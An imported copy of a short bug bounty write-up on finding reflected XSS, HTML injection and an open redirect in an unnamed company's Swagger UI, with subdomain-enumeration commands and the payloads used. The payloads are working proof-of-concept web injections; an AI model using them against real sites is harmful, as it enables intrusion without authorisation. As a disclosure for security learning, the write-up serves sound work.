---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-09-09_single-xss-with-earn-600.md
original_filename: 2023-09-09_single-xss-with-earn-600.md
title: Single XSS with Earn $600
category: documents
detected_topics:
- xss
- rate-limit
- idor
- command-injection
- api-security
tags:
- imported
- documents
- xss
- rate-limit
- idor
- command-injection
- api-security
language: en
raw_sha256: d77a47e41e611e4b1d13e290f315e8353689c5fdab8d1e7f79e13f1f53c41ea5
text_sha256: 1a38338480a9663340c87bdd2ecb762e49fe577b957ca03ee826ac6c71ed1c95
ingested_at: '2026-06-28T07:32:26Z'
sensitivity: unknown
redactions_applied: false
---

# Single XSS with Earn $600

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-09-09_single-xss-with-earn-600.md
- Source Type: markdown
- Detected Topics: xss, rate-limit, idor, command-injection, api-security
- Ingested At: 2026-06-28T07:32:26Z
- Redactions Applied: False
- Raw SHA256: `d77a47e41e611e4b1d13e290f315e8353689c5fdab8d1e7f79e13f1f53c41ea5`
- Text SHA256: `1a38338480a9663340c87bdd2ecb762e49fe577b957ca03ee826ac6c71ed1c95`


## Content

---
title: "Single XSS with Earn $600"
url: "https://medium.com/@yeyinthtet305/single-xss-with-earn-600-c1199f5c7fce"
authors: ["Yeyinthtet (@ye_yint_htet)"]
bugs: ["XSS"]
bounty: "600"
publication_date: "2023-09-09"
added_date: "2023-09-13"
source: "pentester.land/writeups.json"
original_index: 794
scraped_via: "browseros"
---

# Single XSS with Earn $600

Single XSS with Earn $600
Yeyinthtet
Follow
2 min read
·
Sep 8, 2023

12

my name is ye yint htet i’m bug bounty hunter from myanmar today i’m sharing how i’m found xss vuln and this bug with i’m earned $600

let’s dive into our story

i’m not have permission for company name disclosed let’s call target.com first step is simple i’m make subdomain enumeration

subfinder -d target.com -silent -o list.txt

second step also simple thing i’m checking what domain is alive or not

httpx -l list.txt -sc — title > httpx_target.txt

now i’m open alive domain list and oen of their subdomain is redirect me port 4343 and showing me connection time out

Press enter or click to view image in full size
redirect port 4343

this is interested thing so i’m start make directory brute force in this domain

Get Yeyinthtet’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

then i’m found this interested path /api/

Press enter or click to view image in full size

then i’m open it in my firefox broswer https://subdomain.target.com/api/

this domain in they are use swagger ui now i’m start testing swagger ui xss

https://subdomain.target.com/api/index.html?url=https://jumpy-floor.surge.sh/test.yaml

then alert is pop up then i’m inject this url paramter in also <h1>Hello</h1> this is reflect Hello so this parameter have also html injection i’m inject xss payload like this url=”xss><svg/onload=alert()> then again alert is pop up

i’m also found open redirect https://subdomain.target.com/api/index.html?url=<meta http-equiv="Refresh" content="0; url='https://www.google.com'" /> you are redirect google.com if you found html injection you can test this

Reference: https://vidocsecurity.ghost.io/blog/hacking-swagger-ui-from-xss-to-account-takeovers/

Report To Program : 18 Aug 2023 11:30:26 UTC

Triage : 31 Aug 2023 04:20:21 UTC

Reward: 31 Aug 2023 19:22:13 UTC
